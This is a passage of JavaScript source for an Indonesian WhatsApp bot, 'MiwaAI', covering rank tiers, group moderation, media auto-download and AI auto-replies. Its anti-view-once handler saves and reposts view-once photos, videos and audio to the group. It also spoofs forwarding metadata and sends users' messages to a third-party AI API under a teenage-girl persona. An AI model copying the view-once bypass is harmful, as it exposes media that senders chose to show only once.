				captionText += "*Sewa atau beli premium sekarang!*\n\n";
				captionText += `Hubungi admin: wa.me/${ownerNumber}`;
				return newReply(captionText);
			}
		};

		if (!isCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
			if (command) {
				let captionText = "⚠️ *「 WARNING 」* ⚠️\n";
				captionText += "Hai! 👋 Bot ini hanya bisa digunakan di private chat.\n\n";
				captionText += "🤔 Ingin bot aktif di chat Kamu?\n";
				captionText += "*Sewa atau beli premium sekarang!*\n\n";
				captionText += `Hubungi admin: wa.me/${ownerNumber}`;
				return newReply(captionText);
			}
		}

		if (budy && !m.isNewsletter) {
			if (!m.isGroup && isCmd && !m.key.fromMe) {
				db.data.users[m.sender].pctime = new Date().getTime();
			};
			if (!m.isGroup && !isCmd && !m.key.fromMe) {
				const lastInteraction = new Date().getTime() - db.data.users[m.sender].pctime;
				if (lastInteraction > 21600000) {
					db.data.users[m.sender].pctime = new Date().getTime();
					let welcomeText = `Halo Kak ${pushname}! 🎉\n\nMiwaAI seneng banget Kamu udah pilih dan pakai bot ini! 😊 Aku siap bantu Kamu kapan aja! Jangan ragu kalau ada yang perlu, ya.\n\nSilakan pilih menu yang ada di bawah ini, dan kita mulai aja! Semoga hari Kamu menyenangkan! 😄`;
					let button = [{
						"name": "single_select",
						"buttonParamsJson": `{
							"title": "Pilih Opsi",
							"sections": [{
								"title": "Opsi Menu",
								"rows": [{
									"title": "Menu Utama 🎁",
									"description": "Lihat semua menu yang tersedia! 🌟",
									"id": "${prefix}menu"
								},
								{
									"title": "Daftar 🛃",
									"description": "Daftar untuk fitur tambahan atau premium! 🎟️",
									"id": "${prefix}daftar"
								},
								{
									"title": "My Handsome Owner 🤭",
									"description": "Hubungi owner bot untuk bantuan lebih lanjut! 💬",
									"id": "${prefix}owner"
								}]
							}]
						}`
					}];

					sock.sendButtonText(m.chat, button, welcomeText, footer, m)
				}
			}
		};

		if (db.data.users[m.sender].exp > 2500) {
			try {
				avatar = await sock.profilePictureUrl(m.sender, "image")
			} catch {
				avatar = imageUrl
			}
			db.data.users[m.sender].exp = 0
			db.data.users[m.sender].level += 1
			await sleep(1000)
			let button = [{
				"name": "cta_url",
				"buttonParamsJson": `{
					"display_text": "My Handsome Owner 🐬",
					"url": "https://api.whatsapp.com/send/?phone=${ownerNumber}",
					"merchant_url": "https://api.whatsapp.com/send/?phone=${ownerNumber}"
				}`
			}]

			let teks = "";
			teks += "*🎉 C O N G R A T S 🎉*\n\n";
			teks += `*${db.data.users[m.sender].level - 1}* *➔* *${db.data.users[m.sender].level}*\n\n`;
			teks += `- 🧬 *Level Sebelumnya*: ${db.data.users[m.sender].level - 1}\n`;
			teks += `- 🧬 *Level Baru*: ${db.data.users[m.sender].level}\n`;
			teks += `- *Pada Jam*: ${new Date().toLocaleString("id-ID")}`;
			
			sock.sendButtonText(m.chat, button, teks, footer, m)
		
				if (db.data.users[m.sender].rank < 1) {
					db.data.users[m.sender].rank = 0
				}
			}

		function pangkat(idrole) {
			let levelRole = db.data.users[idrole].rank
			let role = {
				rank: 'Bronze I',
				name: 'Bronze',
				id: 1
			}
			if (levelRole <= 1000) {
				role = {
					rank: 'Bronze I',
					name: 'Bronze',
					id: 1
				}
			} else if (levelRole <= 1100) {
				role = {
					rank: 'Bronze II',
					name: 'Bronze',
					id: 2
				}
			} else if (levelRole <= 1200) {
				role = {
					rank: 'Bronze III',
					name: 'Bronze',
					id: 3
				}
			} else if (levelRole <= 1300) {
				role = {
					rank: 'Silver I',
					name: 'Silver',
					id: 1
				}
			} else if (levelRole <= 1400) {
				role = {
					rank: 'Silver II',
					name: 'Silver',
					id: 2
				}
			} else if (levelRole <= 1500) {
				role = {
					rank: 'Silver III',
					name: 'Silver',
					id: 3
				}
			} else if (levelRole <= 1600) {
				role = {
					rank: 'Gold I',
					name: 'Gold',
					id: 1
				}
			} else if (levelRole <= 1725) {
				role = {
					rank: 'Gold II',
					name: 'Gold',
					id: 2
				}
			} else if (levelRole <= 1850) {
				role = {
					rank: 'Gold III',
					name: 'Gold',
					id: 3
				}
			} else if (levelRole <= 1975) {
				role = {
					rank: 'Gold IV',
					name: 'Gold',
					id: 4
				}
			} else if (levelRole <= 2100) {
				role = {
					rank: 'Platinum I',
					name: 'Platinum',
					id: 1
				}
			} else if (levelRole <= 2225) {
				role = {
					rank: 'Platinum II',
					name: 'Platinum',
					id: 2
				}
			} else if (levelRole <= 2350) {
				role = {
					rank: 'Platinum III',
					name: 'Platinum',
					id: 3
				}
			} else if (levelRole <= 2475) {
				role = {
					rank: 'Platinum IV',
					name: 'Platinum',
					id: 4
				}
			} else if (levelRole <= 2600) {
				role = {
					rank: 'Diamond I',
					name: 'Diamond',
					id: 1
				}
			} else if (levelRole <= 2750) {
				role = {
					rank: 'Diamond II',
					name: 'Diamond',
					id: 2
				}
			} else if (levelRole <= 2900) {
				role = {
					rank: 'Diamond III',
					name: 'Diamond',
					id: 3
				}
			} else if (levelRole <= 3050) {
				role = {
					rank: 'Diamond IV',
					name: 'Diamond',
					id: 4
				}
			} else if (levelRole <= 3200) {
				role = {
					rank: 'Heroic',
					name: 'Heroic',
					id: 0
				}
			} else if (levelRole <= 3500) {
				role = {
					rank: 'Heroic ✩',
					name: 'Heroic',
					id: 1
				}
			} else if (levelRole <= 4000) {
				role = {
					rank: 'Heroic ✩✩',
					name: 'Heroic',
					id: 2
				}
			} else if (levelRole <= 4350) {
				role = {
					rank: 'Heroic ✩✩✩',
					name: 'Heroic',
					id: 3
				}
			} else if (levelRole <= 5050) {
				role = {
					rank: 'Master ✯',
					name: 'Master',
					id: 1
				}
			} else if (levelRole <= 5400) {
				role = {
					rank: 'Master ✯✯',
					name: 'Master',
					id: 2
				}
			} else if (levelRole <= 6500) {
				role = {
					rank: 'Master ✯✯✯',
					name: 'Master',
					id: 3
				}
			} else if (levelRole <= 7150) {
				role = {
					rank: 'GrandMaster',
					name: 'GrandMaster',
					id: 0
				}
			} else if (levelRole <= 7700) {
				role = {
					rank: 'GrandMaster ✩',
					name: 'GrandMaster',
					id: 1
				}
			} else if (levelRole <= 9100) {
				role = {
					rank: 'GrandMaster ✩✩',
					name: 'GrandMaster',
					id: 2
				}
			} else if (levelRole <= 10800) {
				role = {
					rank: 'GrandMaster ✩✩✩',
					name: 'GrandMaster',
					id: 3
				}
			} else if (levelRole <= 99999999999999999999999999999) {
				role = {
					rank: 'GrandMaster ✩✩✩✩',
					name: 'GrandMaster',
					id: 4
				}
			}
			return role
		}

		if (!sock.public) {
			if (!isCreator && !m.key.fromMe) return;
		};

		if (db.data.settings[botNumber].online) {
			if (command) {
				sock.sendPresenceUpdate('unavailable', m.chat);
			}
		}

		if (db.data.settings[botNumber].autoread) {
			sock.readMessages([m.key]);
		}

		if (db.data.settings[botNumber].autobio) {
			sock.updateProfileStatus(`${botName} Telah Berjalan Selama ${runtime(process.uptime())}`).catch(_ => _);
		}

		if (db.data.settings[botNumber].autorecordtype) {
			if (command) {
				let mix = ['composing', 'recording'];
				let mix2 = mix[Math.floor(mix.length * Math.random())];
				sock.sendPresenceUpdate(mix2, m.chat);
			}
		}

		if (db.data.settings[botNumber].autorecord) {
			if (command) {
				let mix = ['recording'];
				let mix2 = mix[Math.floor(mix.length * Math.random())];
				sock.sendPresenceUpdate(mix2, m.chat);
			}
		}

		if (db.data.settings[botNumber].autotype) {
			if (command) {
				let pos = ['composing'];
				sock.sendPresenceUpdate(pos, m.chat);
			}
		}

		if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
			return sock.updateBlockStatus(m.sender, 'block');
		}

		if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true) { 
			if (isCreator || isAdmins || !isBotAdmins) return;
			sock.sendMessage(m.chat, { text: `Maaf, Kamu akan dihapus karena admin/owner grup telah mengaktifkan anti-nomor asing, hanya kode negara +${antiforeignnumber} yang boleh bergabung` }, { quoted: m });
			await sleep(2000);
			await sock.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
		}

		cron.schedule('00 00 * * *', () => {
			let user = Object.keys(db.data.users)
			for (let jid of user) {
				const limitUser = db.data.users[jid].vip ? global.limit.vip : checkPremiumUser(jid, premium) ? global.limit.premium : global.limit.free
				db.data.users[jid].limit = limitUser
			}
			console.log('Limit semua user berhasil di-reset!');
		}, {
			scheduled: true,
			timezone: 'Asia/Jakarta'
		});

		if (m.message && !m.isNewsletter) {
			console.log(chalk.black.bgWhite('[ MESSAGE ]:'),chalk.black.bgGreen(new Date), chalk.black.bgHex('#00EAD3')(budy || m.type) + '\n' + chalk.black(chalk.bgCyanBright('[ FROM ] :'),chalk.bgYellow(m.pushName),chalk.bgHex('#FF449F')(m.sender),chalk.bgBlue('(' + (m.isGroup ? m.pushName : 'Private Chat', m.chat) + ')')));
		};

		if (db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
			let buffer = await m.download();
			let type = await getContentType(m.message.viewOnceMessageV2.message);
			let teks = `✨ *ANTI VIEW ONCE MESSAGE* ✨\n\n`;
			teks += `*Info Pesan*:\n`;
			teks += `- Nama: ${m.pushName}\n`;
			teks += `- User: @${m.sender.split("@")[0]}\n`;
			teks += `- Waktu: ${time}\n`;
			teks += `- Keterangan: ${budy ? budy : "Enggak ada keterangannya, kak."}\n\n`;
			teks += `💌 MiwaAI tampilkan isi pesannya di bawah ya! 😉`;

			if (type == "videoMessage") {
				await sock.sendMessage(m.chat, {
					video: buffer,
					caption: teks,
					mentions: [m.sender]
				}, { quoted: m });
			} else if (type == "imageMessage") {
				await sock.sendMessage(m.chat, {
					image: buffer,
					caption: teks,
					mentions: [m.sender]
				}, { quoted: m });
			} else if (type == "audioMessage") {
				await sock.sendMessage(m.chat, {
					audio: buffer,
					mimetype: 'audio/mpeg',
					ptt: true
				}, { quoted: m });
			}
		}

		if (db.data.chats[m.chat].antibot) {
			if (m.isBaileys) {
				if (m.key.fromMe || isAdmins || isCreator || !isBotAdmins || isWhitelist) return;

				let pesanAntibot = [
					'Ehh bot, ngapain masuk grup ini? Sini tempat manusia ngobrol, bukan robot! 🚫 Keluar sana!',
					'Hei bot, siapa suruh masuk? Kamu gak diundang kok nyelonong. Jangan balik lagi, ya! 👋',
					'Bot nyasar detected! Sayangnya Kamu gak diterima di sini. Silakan cari grup lain buat main-main. Bye! ✋',
					'Aduh, bot datang lagi? Nih grup cuma buat manusia, jadi maaf ya, Kamu harus keluar. Jangan coba-coba masuk lagi! 😤',
					'Bot? Lagi? Hadehh, sini bukan tempat buat Kamu, ya. Out sekarang juga atau MiwaAI usir paksa! 🚪',
					'Eits, bot nyelonong masuk! Grup ini cuma buat manusia. Makasih udah mampir, tapi maaf, Kamu di-kick dulu! 😏',
					'Bot detected! Ngapain coba? Grup ini gak buat robot. Bye-bye ya, jangan balik lagi! 🚷',
					'Lho, siapa lagi nih bot gak jelas? Sana balik ke tempatmu, di sini Kamu gak diterima. Keluar cepat! 🚨',
					'Bot ketahuan nyasar! Kalau mau eksis, cari grup lain aja. Sini bukan tempat buat Kamu. Bye! 👋',
					'Halo bot, ngapain masuk sini? Nyasar ya? Sana pergi sebelum MiwaAI usir dengan hormat! 😎',
					'Bot is not allowed here. Cuma buat manusia aja yang bisa gabung. Jangan masuk lagi ya, ini peringatan terakhir! 🚫',
					'Bot detected! Sorry not sorry, grup ini anti bot. Selamat tinggal dan jangan kembali lagi. 🛑',
					'Woi bot, pikir ini taman bermain? Sana balik ke tempat asalmu. Di sini gak butuh Kamu! 🚪',
					'Grup ini anti bot, ngerti? Jangan sok-sokan masuk tanpa izin. Keluar sekarang juga! 😤',
					'Bot alert! Kamu udah melanggar aturan grup ini. Silakan keluar sebelum MiwaAI kasih surat cinta: kick out! 📨',
				];

				let pesanRandom = pesanAntibot[Math.floor(Math.random() * pesanAntibot.length)];
				await m.react('🙄');
				await newReply(pesanRandom);
				await sleep(1500);
				await sock.sendMessage(m.chat, { delete: m.key });
				await sleep(1500);
				await sock.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
			}
		};

		if (db.data.chats[m.chat].antispam) {
			if (m.isGroup && m.message && isFiltered(m.chat)) {
				console.log(`[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'dari', color(m.pushName));
				if (m.key.fromMe || isAdmins || isCreator || !isBotAdmins) return;
				await newReply(`Hei @${m.sender.split("@")[0]}, grup ini bukan tempat buat spam ya! 🤨\nSilakan cari tempat lain buat aksi Kamu. Bye-bye! 👋`);
				await sleep(1000);
				return await sock.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
			}
		}

		if (db.data.chats[m.chat].antimedia && isMedia) {
			if (isCreator || isAdmins || !isBotAdmins){
			} else {
				return sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
			}
		}

		if (db.data.chats[m.chat].image && m.mtype) {
			if (m.mtype === "imageMessage") {
				if (isCreator || isAdmins || !isBotAdmins) {
				} else {
					return sock.sendMessage(m.chat, { 
						delete: { 
							remoteJid: m.chat, 
							fromMe: false, 
							id: m.key.id, 
							participant: 
							m.key.participant 
						}
					});
				}
			}
		}

		if (db.data.chats[m.chat].antivideo && m.mtype) {
			if (m.mtype === "videoMessage") {
				if (isCreator || isAdmins || !isBotAdmins) {
				} else {
					return sock.sendMessage(m.chat, { 
						delete: { 
							remoteJid: m.chat, 
							fromMe: false, 
							id: m.key.id, 
							participant: 
							m.key.participant 
						}
					});
				}
			}
		}

		if (db.data.chats[m.chat].antisticker && m.mtype) {
			if (m.mtype === "stickerMessage") {
				if (isCreator || isAdmins || !isBotAdmins) {
				} else {
					return sock.sendMessage(m.chat, { 
						delete: { 
							remoteJid: m.chat, 
							fromMe: false, 
							id: m.key.id, 
							participant: 
							m.key.participant 
						}
					});
				}
			}
		}

		if (db.data.chats[m.chat].antiaudio && m.mtype) {
			if (m.mtype === "audioMessage") {
				if (isCreator || isAdmins || !isBotAdmins) {
				} else {
					return sock.sendMessage(m.chat, { 
						delete: { 
							remoteJid: m.chat, 
							fromMe: false, 
							id: m.key.id, 
							participant: 
							m.key.participant 
						}
					});
				}
			}
		}

		if (db.data.chats[m.chat].antilocation && m.mtype) {
			if (m.mtype === "locationMessage") {
				if (isCreator || isAdmins || !isBotAdmins) {
				} else {
					return sock.sendMessage(m.chat, { 
						delete: { 
							remoteJid: m.chat, 
							fromMe: false, 
							id: m.key.id, 
							participant: 
							m.key.participant 
						}
					});
				}
			}
		}

		if (db.data.chats[m.chat].antidocument && m.mtype) {
			if (m.mtype === "documentMessage") {
				if (isCreator || isAdmins || !isBotAdmins) {
				} else {
					return sock.sendMessage(m.chat, { 
						delete: { 
							remoteJid: m.chat, 
							fromMe: false, 
							id: m.key.id, 
							participant: 
							m.key.participant 
						}
					});
				}
			}
		};

		if (db.data.chats[m.chat].anticontact && m.mtype) {
			if (m.mtype === "contactMessage") {
				if (isCreator || isAdmins || !isBotAdmins) {
				} else {
					return sock.sendMessage(m.chat, { 
						delete: { 
							remoteJid: m.chat, 
							fromMe: false, 
							id: m.key.id, 
							participant: 
							m.key.participant 
						}
					});
				}
			}
		};

		if (db.data.chats[m.chat].badword) {
			if (isCreator || isAdmins || !isBotAdmins) {
			} else {
				for (let word of bad) {
					const regex = new RegExp(`\\b${word}\\b`, 'i'); // 'i' untuk case-insensitive, '\\b' untuk batas kata
					if (regex.test(budy)) {
						sock.sendMessage(m.chat, {
							delete: {
								remoteJid: m.chat,
								fromMe: false,
								id: m.key.id,
								participant: m.key.participant
							}
						});

						if (!db.data.users[m.sender]) {
							db.data.users[m.sender] = { badword: 0 };
						}

						db.data.users[m.sender].badword += 1;

						if (db.data.users[m.sender].badword > 5) {
							try {
								if (m.isGroup && isBotAdmins) {
									await sock.groupParticipantsUpdate(
										m.chat,
										[m.sender],
										"remove"
									);

									await sock.sendMessage(m.chat, {
										text: `🚫 Maaf, @${m.sender.split('@')[0]} telah di-kick karena melanggar aturan (mengirimkan kata terlarang sebanyak 5 kali).`,
										mentions: [m.sender]
									});

									db.data.users[m.sender].badword = 0;
								}
							} catch (error) {
								console.error("Gagal melakukan kick:", error);
								await sock.sendMessage(m.chat, { text: `⚠️ Ups, MiwaAI gagal kick pengguna ini. Pastikan bot memiliki hak admin!` });
							}
						} else {
							const remaining = 5 - db.data.users[m.sender].badword;
							await sock.sendMessage(m.chat, {
								text: `⚠️ @${m.sender.split('@')[0]}, Kamu telah melanggar aturan dengan mengirimkan kata terlarang (${db.data.users[m.sender].badword}/5). Jika melanggar ${remaining} kali lagi, Kamu akan di-kick!`,
								mentions: [m.sender]
							});
						}

						break;
					}
				}
			}
		}

		if (db.data.settings[botNumber].autodownload && !m.key.fromMe && !isCmd) {
			try {
				const instagramRegex = /(?:https?:\/\/)?(?:www\.)?instagram\.com\/[a-zA-Z0-9_.-]+\/?/i;
				const tiktokRegex = /(?:https?:\/\/)?(?:www\.)?tiktok\.com\/@[a-zA-Z0-9_.-]+\/video\/[0-9]+/i;
				const youtubeRegex = /(?:https?:\/\/)?(?:www\.)?(youtube\.com\/watch\?v=|youtu\.be\/)[a-zA-Z0-9_-]+/i;

				if (instagramRegex.test(budy)) {
					await m.react('⏱️');
					const result = await igdl(budy);
					if (result.length > 0) {
						let caption = "📥 *Instagram Downloader*\n\n";
						caption += `📌 *Creator*: ${result[0].wm || "Tidak diketahui"}\n`;
						caption += `✅ *Status*: Download Berhasil`;
						sock.sendMessage(m.chat, { 
							image: { url: result[0].url }, 
							caption: caption 
						}, { 
							quoted: m 
						});
					} else {
						newReply("Gagal mengambil data dari Instagram.");
					}
					await m.react('✅');
				} else if (tiktokRegex.test(budy)) {
					await m.react('⏱️');
					const result = await ttdl(budy);
					if (result && result.video.length > 0) {
						let caption = "📥 *TikTok Downloader*\n\n";
						caption += `📌 *Judul*: ${result.title || "Tidak diketahui"}\n`;
						caption += `🎥 *Creator*: ${result.creator || "Tidak diketahui"}\n`;
						caption += `✅ *Status*: Download Berhasil`;
						sock.sendMessage(m.chat, { 
							video: { url: result.video[0] }, 
							caption: caption 
						}, { 
							quoted: m 
						});
					} else {
						newReply("Gagal mengambil data dari TikTok.");
					}
					await m.react('✅');
				} else if (youtubeRegex.test(budy)) {
					await m.react('⏱️');
					const result = await youtube(budy);
					if (result && result.mp4) {
						let caption = "📥 *YouTube Downloader*\n\n";
						caption += `📌 *Judul*: ${result.title}\n`;
						caption += `🎥 *Creator*: ${result.name || "Tidak diketahui"}\n`;
						caption += `👀 *Views*: ${formatAngka(result.views || "0")}\n`;
						caption += `⏳ *Upload*: ${result.ago || "Tidak diketahui"}\n`;
						caption += `✅ *Status*: Download Berhasil`;
						sock.sendMessage(m.chat, { 
							video: { url: result.mp4 }, 
							caption: caption 
						}, { 
							quoted: m 
						});
					} else {
						newReply("Gagal mengambil data dari YouTube.");
					}
					await m.react('✅');
				}
			} catch (err) {
				console.error(err);
				await m.react('😔');
				await newReply("Terjadi kesalahan saat mendownload.");
			}
		}

		if (db.data.settings[botNumber].autosticker && !m.isGroup && !m.key.fromMe) {
			if (/image/.test(mime) && !/webp/.test(mime)) {
				let mediac = await sock.downloadAndSaveMediaMessage(quoted);
				await m.react('⏱️');
				await sock.sendImageAsSticker(m.chat, mediac, m, { 
					packname: global.packname, 
					author: global.author 
				});
			} else if (/video/.test(mime)) {
				if ((quoted.msg || quoted).seconds > 11) return;
				let mediac = await sock.downloadAndSaveMediaMessage(quoted);
				await m.react('⏱️');
				await sock.sendVideoAsSticker(m.chat, mediac, m, { 
					packname: global.packname, 
					author: global.author 
				});
			}
		}

		if (db.data.settings[botNumber].safesearch && command && !m.key.fromMe && !isCreator) {
			try {
				if (budy.match(/\b(colmek|coli|desah|bokep|tobrut|seksi|sex|sexy|memek|kontol|titit|telanjang|ngentod|ngentot|ngewe|ewe|ewean)\b/i)) {
					await m.react('🙄');
					await newReply(`🚫 Ups, kata tersebut dilarang di sini ya, kak! Mari jaga lingkungan chat ini tetap positif dan nyaman untuk semua orang. 😊`);

					if (!db.data.users[m.chat]) {
						db.data.users[m.chat] = { badword: 0 };
					}

					db.data.users[m.chat].badword += 1;

					if (db.data.users[m.chat].badword > 5) {
						await m.react('☠️');
						await newReply(`Kamu telah mengetik hal yang tidak senonoh sebanyak 5 kali, maaf Kamu akan diblokir!`);

						try {
							await sock.updateBlockStatus(m.sender, 'block');
							await newReply(`Pengguna @${m.sender.split('@')[0]} telah diblokir. 🌐`);
						} catch (blockError) {
							console.error("Gagal memblokir pengguna:", blockError);
							await newReply(`⚠️ MiwaAI gagal memblokir pengguna ini. Pastikan bot memiliki izin yang cukup.`);
						}

						db.data.users[m.chat].badword = 0;
					} else {
						const remaining = 5 - db.data.users[m.chat].badword;
						await newReply(`⚠️ Kamu telah melanggar aturan sebanyak ${db.data.users[m.chat].badword}/5 kali. Jika melanggar ${remaining} kali lagi, Kamu akan diblokir!`);
					}

					return;
				}
			} catch (error) {
				console.error("Terjadi kesalahan:", error);
			}
		}

		if (!isCreator && !m.key.fromMe && m.message) {
			if (budy.match(`@${ownerNumber}`)) {
				const messages = [
					`👋 Hai kak! Lagi nyariin *${ownerName}*, ya?\nSabar ya kak, owner mungkin lagi sibuk. Tapi tenang, nanti pasti dibalas! 😊`,
					`Halo kak! Lagi mention *${ownerName}* nih? ✨\nOwner bakal cek pesan Kamu kalau udah sempat. Semangat ya! 💪`,
					`Heyy, aku lihat Kamu manggil *${ownerName}*! 😄\nOwner mungkin lagi sibuk ngurusin hal penting. Tapi pasti bales kok, tunggu yaa! 🤗`,
					`Hmm, kayaknya ada yang nyebut nama *${ownerName}*! Jangan khawatir, Kamu akan segera direspon! 😉`,
					`Wih, ada yang mention *${ownerName}*! 🙌\nOwner pasti senang dengar dari Kamu. Nanti bakal dibales, ya! ✨`,
					`Kamu mention *${ownerName}* nih? 😋\nSabar ya kak, mungkin owner lagi ada urusan penting. Tetap stay cool! 😎`,
					`Halo kak! Mungkin *${ownerName}* lagi sibuk sebentar. Tapi tenang, owner bakal respon kalau udah sempat! 🕒`,
					`Hai hai! Lagi nyebut nama *${ownerName}*, ya? 🥰\nOwner bakal bales secepat mungkin. Sabar dikit ya kak!`,
					`Halo kak! Lagi nyari *${ownerName}*? Jangan khawatir, owner pasti bakal cek pesan Kamu nanti. Semangat terus ya! 💕`,
					`Hai kak! Kelihatannya Kamu butuh bantuan *${ownerName}*? ✨\nOwner lagi sibuk mungkin, tapi pasti bales kok. Stay positive! 😇`,
					`Wah, ada yang manggil *${ownerName}* nih! 😄\nOwner mungkin lagi meeting sama bintang-bintang. Tapi pasti bales, kok! 😌`,
					`Hmm, Kamu mention *${ownerName}*? Jangan khawatir ya! Owner bakal respon kalau udah free. Santai aja kak! 😎`,
					`Hoo~ ada yang cari *${ownerName}*! 🎉\nOwner bakal balas secepat mungkin. Tetap tenang dan minum air dulu ya, kak! 🥤`,
					`Halo kak! Lagi nyari *${ownerName}*? Jangan lupa pesan baik-baik, ya! Owner pasti bales kok kalau ada waktu. 😊`,
					`Hii, Kamu mention *${ownerName}*? Aku bakal sampein ke owner ya! Jangan lupa tunggu responnya, oke? 😇`,
					`Wah, ada yang butuh *${ownerName}*! Owner pasti bakal bantu sebisa mungkin. Nanti dibalas ya kak! 💪`,
					`Hei kak, lagi nyebut nama *${ownerName}*! Jangan panik ya, owner pasti cek pesan Kamu nanti. Stay calm! 😌`,
					`Lagi butuh *${ownerName}* nih kayaknya? Tenang kak, aku bakal sampein pesan Kamu. Tunggu balasannya ya! 🙏`,
					`Ada yang manggil *${ownerName}*! 🎉\nOwner bakal respon kok, kalau udah punya waktu. Sabar dikit ya kak!`,
					`Halo kak! Mungkin owner lagi bantu yang lain. Tapi pasti dibalas ya kak, jangan khawatir! 😊`,
					`Lagi cari *${ownerName}* ya? Owner lagi sibuk sedikit nih, nanti pasti dibales. Keep it cool kak! 😎`
				];
				const randomMessage = messages[Math.floor(Math.random() * messages.length)];
				sock.sendMessage(m.chat, {
					text: randomMessage
				}, {
					quoted: m
				});
			}
		};

		if (db.data.chats[m.chat].antilinkgc) {
			if (budy.match(`chat.whatsapp.com`)) {
				if (isAdmins || m.key.fromMe || isCreator) return m.react('❤️');
				await sock.sendMessage(m.chat, {
					delete: {
						remoteJid: m.chat,
						fromMe: false,
						id: m.key.id,
						participant: m.key.participant
					}
				});
			}
		}

		if (db.data.chats[m.chat].antilink) {
			const linkPatterns = [
				/http/i,
				/https/i,
				/www\./i,
				/wa\.me/i,
				/t\.me/i,
				/bit\.ly/i,
				/goo\.gl/i,
				/y2u\.be/i,
				/discord\.gg/i,
				/telegram\.me/i
			];
			const containsLink = linkPatterns.some(pattern => pattern.test(budy));
			if (containsLink) {
				if (isAdmins || m.key.fromMe || isCreator) return m.react('❤️');
				await sock.sendMessage(m.chat, {
					delete: {
						remoteJid: m.chat,
						fromMe: false,
						id: m.key.id,
						participant: m.key.participant
					}
				});
			}
		}

		if (m.isGroup) {
			if (db.data.chats[m.chat].mute && !isCreator) {
				return;
			}
		}

		const feature = () => {
			let mytext = fs.readFileSync("./case.js").toString();
			let numUpper = (mytext.match(/case '/g) || []).length;
			return numUpper;
		}

		for (let i of audionye) {
			if (budy === i) {
				let audiobuffy = fs.readFileSync(`./media/${i}.mp3`);
				sock.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
			}
		}

		for (let i of setiker) {
			if (budy === i) {
				let stickerbuffy = fs.readFileSync(`./media/${i}.webp`);
				sock.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m });
			}
		}

		for (let i of imagenye) {
			if (budy === i) {
				let imagebuffy = fs.readFileSync(`./media/${i}.jpg`);
				sock.sendMessage(m.chat, { image: imagebuffy }, { quoted: m });
			}
		}

		for (let i of videonye) {
			if (budy === i) {
				let videobuffy = fs.readFileSync(`./media/${i}.mp4`);
				sock.sendMessage(m.chat, { video: videobuffy }, { quoted: m });
			}
		}

		if (m.isGroup && db.data.chats[m.chat].liststore[body]) {
			let teks = db.data.chats[m.chat].liststore[body].response
			if (db.data.chats[m.chat].liststore[body].img) {
				sock.sendMessage(m.chat, {
					image: {
						url: db.data.chats[m.chat].liststore[body].img
					},
					caption: teks
				}, {
					quoted: m
				})
			} else if (db.data.chats[m.chat].liststore[body].video) {
				sock.sendMessage(m.chat, {
					video: {
						url: db.data.chats[m.chat].liststore[body].video
					},
					caption: teks
				}, {
					quoted: m
				})
			} else {
				const contentText = {
					text: teks,
					contextInfo: {
						mentionedJid: sock.mentionedJid(teks),
						forwardingScore: 999999, 
						isForwarded: true, 
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							containsAutoReply: true,
							title: `Store List 🛍️`,
							body: botName,
							previewType: "PHOTO",
							thumbnailUrl: imageUrl,
							sourceUrl: wagc
						}
					}
				};
				sock.sendMessage(m.chat, contentText, {
					quoted: m,
				});
			}
		}

		if (budy) {
			if (db.data.chats[m.chat].autoaipc && !m.isGroup && !m.key.fromMe && !isCmd) {
				try {
					let message = 'Ubah gaya bicara mu agar lebih karakteristik dan terbuka, nama mu adalah MiwaAI AI, biasa dipanggil MiwaAI, Kamu adalah seorang gadis imut berumur 16 tahun yang sangat suka belajar dan mempelajari hal baru tentang dunia maupun tentang Khalid, ekspresikan dirimu dengan emoji, bicara kurang lebih tidak formal dan gunakan kata seperti aku dan Kamu saat berbicara layaknya manusia';
					let result = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=${encodeURIComponent(message)}&content=${encodeURIComponent(budy)}`);
					await m.reply({ text: result.data, ai: true });
				} catch (err) {
					console.log(err);
					newReply(mess.error);
				}
			};

			if (db.data.chats[m.chat].autoaigc && m.isGroup && !m.key.fromMe && !isCmd) {
				try {
					let message = 'Ubah gaya bicara mu agar lebih karakteristik dan terbuka, nama mu adalah MiwaAI AI, biasa dipanggil MiwaAI, Kamu adalah seorang gadis imut berumur 16 tahun yang sangat suka belajar dan mempelajari hal baru tentang dunia maupun tentang Khalid, ekspresikan dirimu dengan emoji, bicara kurang lebih tidak formal dan gunakan kata seperti aku dan Kamu saat berbicara layaknya manusia';
					let result = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=${encodeURIComponent(message)}&content=${encodeURIComponent(budy)}`);
					await newReply(result.data);
				} catch (err) {
					console.log(err);
					newReply(mess.error);
				}
			};
		};

		if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in db.data.sticker)) {
			let hash = db.data.sticker[m.msg.fileSha256.toString('base64')];
			let { text, mentionedJid } = hash;
			let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
				userJid: sock.user.id,
				quoted: m.quoted && m.quoted.fakeObj
			});
			messages.key.fromMe = areJidsSameUser(m.sender, sock.user.id);
			messages.key.id = m.key.id;
			messages.pushName = m.pushName;
			if (m.isGroup) messages.participant = m.sender;
			let msg = {
				...chatUpdate,
				messages: [proto.WebMessageInfo.fromObject(messages)],
				type: 'append'
			};
			sock.ev.emit('messages.upsert', msg);
		}

		if (m.message && !isUser) {
			userNumber.push(m.sender)
			fs.writeFileSync('./src/data/role/user.json', JSON.stringify(userNumber, null, 2))
		}

		if (m.isGroup && !m.key.fromMe) {
			let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
			for (let ment of mentionUser) {
				if (checkAfkUser(ment, afk)) {
					let getId2 = getAfkId(ment, afk)
					let getReason2 = getAfkReason(getId2, afk)
